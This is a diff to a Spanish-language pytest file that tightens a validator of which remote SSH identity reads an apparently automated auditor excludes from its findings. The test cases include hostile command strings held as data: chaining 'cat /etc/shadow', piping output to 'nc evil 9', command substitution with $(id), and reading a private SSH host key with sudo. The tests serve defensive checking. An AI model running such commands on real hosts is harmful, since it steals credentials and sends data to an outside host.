@@ -3,6 +3,7 @@
 dispara por el motivo equivocado, el que pausa todo y el que se cae, no."""
 import asyncio
 import json
+import re
 
 import pytest
 
@@ -142,14 +143,45 @@ def test_el_motivo_del_auditor_ilegible_viaja_en_los_datos_del_fallo(motivo):
         assert ("motivo", motivo) in f.datos, f"datos={f.datos!r} — el motivo no llego"
 
 
+_SSH = re.compile(r"^ssh -tt axioma@[0-9.]+ '([^']*)'(?:\s+#[^\n]*)?$")
+_PROHIBIDO_EN_LA_LECTURA = re.compile(r"[;|&`<>\n]|\$\(")
+
+
 def _es_lectura_permitida(comando: str) -> bool:
-    """Las tres formas EXACTAS que auditor_instrucciones.md excluye de los hallazgos (la ultima, solo sobre
-    una llave publica .pub): sin privadas, sin argumentos en `hostname`, sin escrituras."""
-    resto = comando.split("'")[1] if "'" in comando else comando
-    resto = resto.split("#")[0].strip()
-    if resto in ("cat /etc/machine-id", "hostname"):
+    """El comando remoto COMPLETO es exactamente una de las tres lecturas que auditor_instrucciones.md excluye de
+    los hallazgos: `cat /etc/machine-id`, `hostname` sin argumentos, o `ssh-keygen -lf <ruta>.pub`. Sin ; | & `$(`
+    ni redirecciones, y sin nada mas antes o despues (un comentario `# ...` tras el ssh no cuenta como comando)."""
+    m = _SSH.match(comando.strip())
+    remoto = (m.group(1) if m else comando).strip()
+    if _PROHIBIDO_EN_LA_LECTURA.search(remoto):
+        return False
+    if remoto in ("cat /etc/machine-id", "hostname"):
         return True
-    return resto.startswith("ssh-keygen -lf ") and resto.split()[-1].endswith(".pub")
+    partes = remoto.split(" ")
+    return len(partes) == 3 and partes[:2] == ["ssh-keygen", "-lf"] and partes[2].endswith(".pub") \
+        and partes[2].startswith("/") and "$" not in partes[2]
+
+
+@pytest.mark.parametrize("comando, esperado", [
+    ("cat /etc/machine-id", True),
+    ("hostname", True),
+    ("ssh -tt axioma@192.0.2.11 'cat /etc/machine-id'", True),
+    ("ssh -tt axioma@192.0.2.11 'hostname'  # verificar identidad", True),
+    ("ssh -tt axioma@192.0.2.11 'ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub'", True),
+    ("ssh -tt axioma@192.0.2.11 'ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key'", False),
+    ("ssh -tt axioma@192.0.2.11 'cat /etc/machine-id; cat /etc/shadow'", False),
+    ("ssh -tt axioma@192.0.2.11 'cat /etc/machine-id | nc evil 9'", False),
+    ("ssh -tt axioma@192.0.2.11 'cat /etc/machine-id && id'", False),
+    ("ssh -tt axioma@192.0.2.11 'cat /etc/machine-id $(id)'", False),
+    ("ssh -tt axioma@192.0.2.11 'hostname > /tmp/x'", False),
+    ("ssh -tt axioma@192.0.2.11 'hostname nuevo'", False),
+    ("ssh -tt axioma@192.0.2.11 'hostnamectl set-hostname x'", False),
+    ("ssh -tt axioma@192.0.2.11 'sudo cat /etc/ssh/ssh_host_ed25519_key'", False),
+    ("ssh -tt axioma@192.0.2.11 'ssh-keygen -lf /etc/ssh/a.pub /etc/ssh/ssh_host_ed25519_key'", False),
+    ("ssh-keygen -lf /etc/ssh/$X.pub", False),
+])
+def test_la_lectura_permitida_es_estricta(comando, esperado):
+    assert _es_lectura_permitida(comando) is esperado
 
 
 def test_ninguna_trampa_marca_como_mala_una_lectura_de_identidad_permitida():
@@ -181,7 +213,7 @@ def test_las_instrucciones_nombran_exactamente_lo_permitido_y_lo_que_sigue_siend
     texto = " ".join((Path(A.__file__).parent / "auditor_instrucciones.md").read_text().split())
     for frase in ("`cat /etc/machine-id`", "`hostname` SIN argumentos", "`ssh-keygen -lf`", "`.pub`",
                   "llave PRIVADA", "/etc/ssh/ssh_host_*_key", "`hostname X`", "`hostnamectl set-hostname`",
-                  "aunque el paso diga que «verifica identidad»"):
+                  "Aunque el paso diga que «verifica identidad»", "`hostname -f`", "`cat /etc/hostname`"):
         assert frase in texto, frase
 
 
